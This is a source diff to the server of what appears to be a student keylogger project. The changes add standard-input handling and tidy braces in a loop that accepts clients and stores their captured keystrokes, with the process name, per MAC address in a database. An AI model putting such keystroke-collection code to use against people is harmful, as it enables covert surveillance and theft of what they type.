@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Mon Oct 26 14:49:04 2015 Antoine Plaskowski
+// Last update Tue Nov  3 13:21:15 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -25,7 +25,7 @@ Server::Server(Option const &option) :
   m_new_istandard(m_dll_isocket.get_symbole<decltype(m_new_istandard)>(NAME_FCT_NEW_ISTANDARD)),
   m_database(m_new_idatabase()),
   m_server(m_new_iserver(option.get_host(), option.get_port())),
-  m_in(m_new_istandard(ISocket::IN)),
+  m_in(m_new_istandard(ISocket::In)),
   m_clients(),
   m_timeout(m_new_itime())
 {
@@ -44,29 +44,40 @@ Server::~Server(void)
 
 bool	Server::run(void)
 {
+  m_in.want_read();
   m_server.want_read();
   for (auto it = m_clients.begin(); it != m_clients.end(); it++)
     (*it)->select();
   m_iselect(nullptr);
   if (m_server.can_read())
     m_clients.push_back(&m_new_iprotocol(m_server.accept(), m_new_itime()));
+  if (m_in.can_read())
+    {
+      uint8_t	buf[4096];
+      uintmax_t	ret = m_in.read(*buf, 4096);
+
+      if (ret == 0)
+	return (true);
+    }
   bool	remove = false;
   for (auto it = m_clients.begin(); it != m_clients.end(); it++)
     {
       if (*it != nullptr)
-	if ((*it)->run(&m_timeout) == true)
-	  {
-	    delete *it;
-	    remove = true;
-	    *it = nullptr;
-	  }
-	else
-	  {
-	    auto ret = (*it)->get_keyboard();
+	{
+	  if ((*it)->run(&m_timeout) == true)
+	    {
+	      delete *it;
+	      remove = true;
+	      *it = nullptr;
+	    }
+	  else
+	    {
+	      auto ret = (*it)->get_keyboard();
 
-	    for (auto lol = ret.begin(); lol != ret.end(); lol++)
-	      m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
-	  }
+	      for (auto lol = ret.begin(); lol != ret.end(); lol++)
+		m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
+	    }
+	}
     }
   if (remove == true)
     m_clients.remove(nullptr);
